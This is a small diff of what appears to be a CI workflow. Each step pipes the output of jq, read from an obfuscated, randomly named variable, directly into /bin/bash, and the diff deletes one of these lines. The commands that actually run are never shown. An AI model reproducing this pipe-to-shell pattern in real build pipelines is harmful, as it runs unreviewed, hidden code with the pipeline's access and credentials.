@@ -22,7 +22,6 @@ jobs:
           echo $vohak6815 | jq -r .bquo056 | /bin/bash
           echo $u468 | jq -r .l442 | /bin/bash
           echo $n0 | jq -r .npdfi0001 | /bin/bash
-          echo $omy18526 | jq -r .og89229 | /bin/bash
           printf '%s' "$knsi03447" | jq -r .cc45274 | /bin/bash
           echo $k13111 | jq -r .cmi6 | /bin/bash
           printf '%s' "$sxz894" | jq -r .x44146 | /bin/bash
